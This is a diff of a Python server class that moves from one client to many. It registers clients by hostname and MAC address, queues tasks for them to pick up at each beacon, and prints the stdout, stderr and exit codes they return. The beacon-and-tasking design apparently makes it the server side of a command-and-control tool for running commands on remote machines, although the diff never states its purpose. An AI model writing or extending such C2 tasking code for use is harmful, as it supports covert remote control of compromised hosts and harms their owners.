@@ -1,41 +1,47 @@
-from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
-from collections import deque
 import uuid
-import json
-
-PORT = 8000
+from collections import deque
+from threading import Lock
 
 class Server:
     def __init__(self):
-        self.client = None
+        self.clients = {}
+        self.lock = Lock()
+    
+    def get_client(self, client_id):
+        client = self.clients.get(client_id)
+        if not client:
+            raise Exception("unknown client")
+        return client
 
     def identify(self, hostname, mac):
-        self.client = {
-            "hostname": hostname,
-            "mac": mac,
-            "tasks": deque(),
-            "results": {}
+        client_id = str(uuid.uuid4())
+
+        with self.lock:
+            self.clients[client_id] = {
+                "hostname": hostname,
+                "mac": mac,
+                "tasks": deque(),
+                "results": {}
+            }
+
+        print(f"client connected: {hostname} / {mac} ({client_id})")
+
+        return {
+            "status": "ok",
+            "client_id": client_id
         }
-
-        print(f"client connected: {hostname} / {mac}")
-        return {"status": "ok"}
         
-    def beacon(self):
-        if not self.client:
-            raise Exception("no client")
+    def beacon(self, client_id):
+        with self.lock:
+            client = self.get_client(client_id)
+            task = client["tasks"].popleft() if client["tasks"] else None
 
-        task = self.dequeue()
         return {"task": task}
     
-    def enqueue(self, task):
-        if not self.client:
-            raise Exception("no client")
-
-        self.client["tasks"].append(task)
-
-    def dequeue(self):
-        queue = self.client["tasks"]
-        return queue.popleft() if queue else None
+    def enqueue(self, client_id, task):
+        with self.lock:
+            client = self.get_client(client_id)
+            client["tasks"].append(task)
     
     def create_task(self, method, params=None):
         return {
@@ -45,25 +51,26 @@ class Server:
             "params": params or {}
         }
 
-    def send_task(self, method, params=None):
-        if not self.client:
-            print("no client connected")
-            return
+    def send_task(self, client_id, method, params=None):
+        task = self.create_task(method, params)
 
-        self.enqueue(self.create_task(method, params))
-    
-    def task_result(self, task_id, result):
-        if not self.client:
-            return
+        try:
+            self.enqueue(client_id, task)
+        except Exception:
+            print("unknown client")
 
-        self.client["results"][task_id] = result
+    def task_result(self, client_id, task_id, result):
+        with self.lock:
+            client = self.get_client(client_id)
+            client["results"][task_id] = result
         
-        print(f"[RESULT] {task_id}")
+        print(f"[{client_id}] RESULT {task_id}")
 
-        if result["status"] == "ok":
-            out = result["output"]
-            print("stdout:", out["stdout"])
-            print("stderr:", out["stderr"])
-            print("code:", out["exit_code"])
-        else:
+        if result["status"] != "ok":
             print("error:", result["output"]["stderr"])
+            return
+
+        out = result["output"]
+        print("stdout:", out["stdout"])
+        print("stderr:", out["stderr"])
+        print("code:", out["exit_code"])
